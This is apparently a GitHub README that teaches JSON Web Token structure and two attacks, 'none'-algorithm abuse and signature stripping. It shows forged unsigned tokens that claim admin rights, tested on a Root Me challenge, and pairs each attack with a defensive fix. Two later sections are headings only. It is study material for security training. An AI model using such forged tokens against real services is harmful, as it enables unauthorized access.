# Projet-JWT
Understanding, bypass and securing of Json Web Tokens (JWT)

* ### Prerequisites
Json Web Tokens allow the secure exchange of tokens between several parties. The security of the exchange translates into the verification of the integrity and authenticity of the data. It is carried out using multiple algorithms.

```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```

A token consists of three parts :
- A header, used to describe the token.
- A payload, which represents the information embedded in the token.
- A digital signature.

Example :
<br/> Header : {"alg": "HS256", "typ": "JWT"}
<br/> Payload : {"name":"JulienFink", "iat":1533777438}
<br/> Signature : 4V7KzBemrVji_kCyzGO3lQMZlBuVxryF3YhmMIr4kWI

The signature is crafted using a secret - "Azerty123" in our case.

The "header", "payload" and "signature" parts are then encoded using base64url.

Complete JWT :
```diff
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSnVsaWVuRmluayIsImlhdCI6MTUzMzc3NzQzOH0.KJFzGjs_75Q56mY9QXqpEKU-wE2o3ufF3ZxfIUaexwI
```

Useful links for an overall understanding :
<br/> https://fr.wikipedia.org/wiki/JSON_Web_Token
<br/> https://jwt.io/
<br/> https://www.base64url.com/

* ### Absusing 'none' algorithm

Let us assume you don't have an account on a website, you don't want to create one and you decide to log in as a guest.
A JWT is assigned to your newly created session:

```diff
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Imd1ZXN0In0.
{"typ":"JWT","alg":"none"}.{"username":"guest"}.
```

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6Imd1ZXN0In0.
<br/> {"typ":"JWT","alg":"none"}.{"username":"guest"}.

What would happen if we decided to change the value of the username to "admin" ? We would get a new valid JWT and thus get access to the admin section.

```diff
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
{"typ":"JWT","alg":"none"}.{"username":"admin"}.
```

To avoid this type of Pr0bL3m, do not use 'none' algorithm.

* ### Signature stripping attack

What if we decided to change the algorithm to 'none' in the header part in order to exploit the previous vulnerability ? Let us try the following on a Root Me challenge...

```diff
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
{"typ":"JWT","alg":"HS256"}.{"username":"guest"}.'a signature crafted using a secret unknown to us'
```

We can craft our own JWT :
```diff
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
{"typ":"JWT","alg":"none"}.{"username":"admin"}.
```

Works !

![JWT blur](https://user-images.githubusercontent.com/64968597/135341742-d1aae0d8-deaa-4a66-9202-85529e982067.png)
<br/> https://www.root-me.org/fr/Challenges/Web-Serveur/JSON-Web-Token-JWT-Introduction

To avoid this type of Pr0bL3m, use a whitelist of allowed algorithms. ['HS256', ~~'None'~~]

* ### Brute forcing HS256 secret key

* ### Substitution attack for RS256 algorithm
